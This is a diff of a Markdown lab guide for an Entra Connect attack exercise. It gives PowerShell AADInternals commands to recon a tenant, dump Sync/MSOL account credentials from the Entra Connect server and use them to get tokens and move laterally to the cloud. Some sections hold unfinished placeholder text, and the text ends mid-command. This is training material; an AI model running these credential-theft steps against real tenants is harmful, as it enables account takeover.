@@ -1,39 +1,83 @@
 # Lab 2 - Entra Connect Attacks
-### Prepare a victim user with high privileges
+### Preparations
+#### Prepare a victim user with high privileges:
 in Entra portal (login with your admin tenant creds), select ***user1*** and assign it with the **Active** (not *Eligible*) **Application Administrator** role
 
 
 
-# Attacks
-From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Entra Connect server (in our case- it's the DC VM)
+# Instructions
+From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Entra Connect server (in our case- it's the DC VM), and you know the Entra tenant domain ()
 
-## 1. Extract Entra Connect Credentials and target a victim user
+# Start 
 
-#### 1. Recon - Seamless SSO status + tenant id:
-```powershell
-Invoke-AADIntReconAsOutsider -DomainName YOURDOMAIN.onmicrosoft.com
-```
+## 1. Reconnaissance
+Using AADInternals, do a bit of recon to find out the the tenant ID, and if the tenant has Seamless SSO turned on..
 
-#### 2. Dumping and Extracting Entra (Azure AD) Connect credentials:
-1. run powershell as admin on the server where Entra Connect is installed
-2. execute:
+<details>
+<summary><b>Solution</b></summary>
+
 ```powershell
 Import-Module AADInternals
+Invoke-AADIntReconAsOutsider -DomainName YOURDOMAIN.onmicrosoft.com
+```
+</details>
+
+
+### 2. Dumping and Extracting Entra Connect credentials:
+Now that you've got basic info, get the credentials of the Sync and MSOL accounts.
+
+<details>
+<summary><b>Solution</b></summary>
+
+Execute in a powershell:
+
+```powershell
 Get-AADIntSyncCredentials
 ```
+keep the creds aside :)
+</details>
 
-#### 2. Finding a target (victim) user to attack
+
+
+
+### 3. Finding a target (victim) user to attack
+We got:
+1. Tenant ID + domain
+2. Sync_xx account credentials
+
+In order to move laterally to the cloud, we should find a synced user that we can take over...
+
+
+<details>
+<summary><b>Solution</b></summary>
+
+See which users are Active Directory users that are synced to the cloud...
+ <details>
+ <summary><b>Solution 2</b></summary>
+
+ 1. Use AADInternals to get an access token for AAD Graph
+ 2. dsad dsafds
+
+ ```powershell
+ 
+ ```
+ </details>
+
+</details>
+
+
+
 
 Login using dumped Sync_XX account:
 ```powershell
 # Prompt for credentials and retrieve & store access token to cache
 # Enter your dumped Sync_XX account creds!
 $tenantId = "YOUR_TENANT_ID"
-$at = Get-AADIntAccessTokenForAADGraph -SaveToCache
+$at = Get-AADIntAccessTokenForAADGraph
 
 # method 1: 
 $userUPN = "Sync_xxx@YOURDOMAIN.onmicrosoft.com" # change the username
-Connect-AzureAD -AccountId  $userUPN  -TenantId $tenantId -AadAccessToken $at
+Connect-AzureAD -AccountId $userUPN  -TenantId $tenantId -AadAccessToken $at
 
 # method 2:
 Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id,
